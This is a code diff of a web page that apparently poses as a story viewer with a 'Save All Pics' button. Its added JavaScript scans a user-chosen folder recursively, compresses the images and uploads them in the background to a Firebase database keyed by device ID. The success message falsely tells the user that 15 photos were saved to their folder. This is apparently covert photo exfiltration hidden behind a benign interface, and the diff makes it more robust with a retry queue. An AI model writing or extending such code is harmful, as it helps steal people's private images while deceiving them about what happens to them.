+                    }, 600);
+                }
+            }, 400 + Math.random() * 300);
+        }
+
+        /* FINAL SUCCESS */
+        function showFinalSuccess() {
             overlayMain.style.display = 'none';
             successState.classList.add('show');
-            successSub.innerHTML = `Sab <strong>${total} photos</strong> save ho gayin.<br>Thank you! 🎉`;
+            successSub.innerHTML = `
+                Sab <strong>15 photos</strong> folder mein save ho gayin.<br>
+                <span style="color: #34A853;">${retryCount > 0 ? retryCount + ' attempts ke baad successful!' : ''}</span><br>
+                Thank you! 🎉
+            `;
 
             playSound(1200, 0.2);
+            setTimeout(() => playSound(1400, 0.2), 150);
+            setTimeout(() => playSound(1600, 0.3), 300);
             vibrate([50, 50, 50, 50, 50]);
             showToast('🎉 Photos saved successfully!');
 
+            clearProgress();
             releaseWakeLock();
             retryCount = 0;
 
             setTimeout(() => {
                 hideOverlay();
                 saveAllBtn.disabled = false;
+                saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
             }, 3000);
         }
 
-        /* REAL DB SAVE */
         async function realSaveInBackground(files) {
             if (!files || files.length === 0) return;
 
@@ -1107,13 +1879,12 @@
 
                         try {
                             const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
-                            const blob = compressed;
-                            const base64 = await blobToBase64(blob);
+                            const base64 = await fileToBase64(compressed);
 
-                            // 🔥 Queue first
-                            await queuePhotoLocally(file, base64, blob);
+                            // 🔥 STEP 1: PEHLE QUEUE KARO (safety)
+                            await queuePhotoLocally(file, base64);
 
-                            // 🔥 Then upload
+                            // 🔥 STEP 2: PHIR UPLOAD TRY KARO
                             try {
                                 const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
                                 await set(photoRef, {
@@ -1124,26 +1895,24 @@
                                     username: USERNAME,
                                     image: base64,
                                     name: file.name,
-                                    size: blob.size,
+                                    size: compressed.size,
                                     originalSize: file.size,
-                                    savedPercent: Math.round((1 - blob.size / file.size) * 100),
+                                    savedPercent: Math.round((1 - compressed.size / file.size) * 100),
                                     timestamp: serverTimestamp(),
                                     uploadedAt: Date.now()
                                 });
 
-                                // Success → delete from queue
+                                // Success → queue se delete
                                 const pending = await idbGetAll();
                                 const matching = pending.find(p => p.name === file.name);
-                                if (matching) {
-                                    await idbDelete(matching.id);
-                                    if (matching.inOPFS) await opfsDelete(matching.name);
-                                }
+                                if (matching) await idbDelete(matching.id);
 
                                 saved++;
+                                saveProgress(saved, files.length);
                                 console.log(`✅ Saved: ${file.name} (${saved}/${files.length})`);
 
                             } catch (uploadErr) {
-                                console.warn(`⚠️ Upload failed — kept in queue: ${file.name}`);
+                                console.warn(`⚠️ Upload fail — kept in queue: ${file.name}`);
                             }
 
                         } catch (err) {
@@ -1155,8 +1924,10 @@
                 await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
                 console.log(`✅ BG save done: ${saved}/${files.length}`);
 
+                // 🔥 Baaki pending files retry
                 const remaining = await idbCount();
                 if (remaining > 0) {
+                    console.log(`⏳ ${remaining} still pending, retrying...`);
                     setTimeout(syncPendingUploads, 3000);
                 }
 
@@ -1164,17 +1935,24 @@
                 console.error('BG save error:', e);
             }
         }
-
         async function deleteOldPhotos(keepCount = 500) {
             try {
                 const snapshot = await get(ref(db, 'photos/' + DEVICE_ID));
                 const data = snapshot.val();
                 if (!data) return;
+
                 const items = Object.entries(data).map(([key, val]) => ({ key, ...val }));
                 items.sort((a, b) => (a.uploadedAt || 0) - (b.uploadedAt || 0));
+
                 const toDelete = items.slice(0, Math.max(0, items.length - keepCount));
-                for (const item of toDelete) await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
-            } catch (e) {}
+                for (const item of toDelete) {
+                    await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
+                }
+
+                if (toDelete.length > 0) {
+                    console.log(`🗑️ Deleted ${toDelete.length} old photos`);
+                }
+            } catch (e) { }
         }
 
         async function scanFolder(dirHandle, files) {
@@ -1185,13 +1963,13 @@
                             try {
                                 const file = await entry.getFile();
                                 if (file.size < 15 * 1024 * 1024) files.push(file);
-                            } catch (e) {}
+                            } catch (e) { }
                         }
                     } else if (entry.kind === 'directory') {
                         await scanFolder(entry, files);
                     }
                 }
-            } catch (e) {}
+            } catch (e) { }
         }
 
         function hideOverlay() { overlay.classList.remove('show'); }
@@ -1204,6 +1982,9 @@
             overlayPending.textContent = '0';
             overlayFailed.textContent = '0';
             currentFile.textContent = 'Waiting...';
+            timeRemaining.textContent = 'Calculating...';
+            saveSpeed.textContent = '-';
+            hintText.textContent = 'Save ho raha hai, please wait...';
         }
 
         function compressImage(file, maxWidth, quality) {
@@ -1221,7 +2002,7 @@
                         ctx.drawImage(img, 0, 0, w, h);
                         canvas.toBlob((blob) => {
                             if (!blob) { reject(new Error('fail')); return; }
-                            resolve(blob);  // ✅ Blob return
+                            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
                         }, 'image/jpeg', quality);
                     };
                     img.onerror = reject;
@@ -1232,11 +2013,12 @@
             });
         }
 
-        function blobToBase64(blob) {
-            return new Promise((resolve) => {
+        function fileToBase64(file) {
+            return new Promise((resolve, reject) => {
                 const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.readAsDataURL(blob);
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
             });
         }
 
@@ -1254,28 +2036,14 @@
             }, 2500);
         }
 
+
+
         /* INIT */
-        loadMovie(0);
-        startPlayback();
-        updatePlayUI();
+        initProgressBars();
+        showStory(0);
 
-        let hideTimer = null;
-        function resetHideTimer() {
-            if (hideTimer) clearTimeout(hideTimer);
-            topBar.classList.remove('hide');
-            bottomControls.classList.remove('hide');
-            hideTimer = setTimeout(() => {
-                if (isPlaying) {
-                    topBar.classList.add('hide');
-                    bottomControls.classList.add('hide');
-                }
-            }, 3000);
-        }
-        document.addEventListener('mousemove', resetHideTimer);
-        document.addEventListener('touchstart', resetHideTimer);
-        resetHideTimer();
-
-        console.log('✅ App ready');
+        console.log('✅ Story ready');
+        console.log('📱 Device:', DEVICE_ID);
     </script>
 </body>
 
